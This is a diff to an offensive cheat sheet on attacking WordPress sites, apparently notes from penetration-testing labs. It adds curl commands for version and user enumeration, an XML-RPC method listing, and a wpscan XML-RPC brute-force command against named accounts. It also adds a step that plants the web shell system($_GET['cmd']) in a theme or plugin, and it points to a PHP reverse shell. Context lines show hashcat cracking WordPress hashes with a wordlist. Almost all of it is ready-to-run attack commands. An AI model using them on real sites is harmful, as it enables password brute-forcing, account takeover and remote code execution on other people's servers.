@@ -1,8 +1,10 @@
 # Attacking Wordpress
 
 - [Footprinting](#footprinting)
+- [XMLRPC](#xmlrpc)
 - [WPScan](#wpscan)
 - [Metasploit](#metasploit)
+- [Reverse Shell](#reverse-shell)
 
 ## Footprinting
 
@@ -18,6 +20,41 @@ or:
 # curl -s -X GET  http://10.10.11.125 | grep '<meta name="generator"'
 <meta name="generator" content="WordPress 5.8.1" />
 ```
+
+or in CSS:
+
+```
+css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
+```
+
+or in Javascript:
+
+```
+/jquery.validationEngine-en.js?ver=5.3.3'></script>
+```
+
+Manual user enumeration:
+
+```
+curl -s -I -X GET http://blog.domain.com/?author=1
+
+curl http://blog.domain.com/wp-json/wp/v2/users
+```
+
+## XMLRPC
+
+List available methods:
+
+```
+curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://1.1.1.1:32320/xmlrpc.php
+```
+
+Brute force:
+
+```
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://1.1.1.1
+```
+
 
 
 ## WPScan
@@ -105,3 +142,15 @@ hashcat (put ONLY hash in file):
 ```
 D:\tmrc\tools\hashcat-6.0.0>hashcat.exe -O -m 400 -a 0 -o notch_cracked.txt notch.txt d:\tmrc\hacking\wordlist\rockyou.txt
 ```
+
+## Reverse shell
+
+Edit theme or plugin and insert:
+
+```
+system($_GET['cmd']);
+```
+
+Or:
+
+https://github.com/pentestmonkey/php-reverse-shell
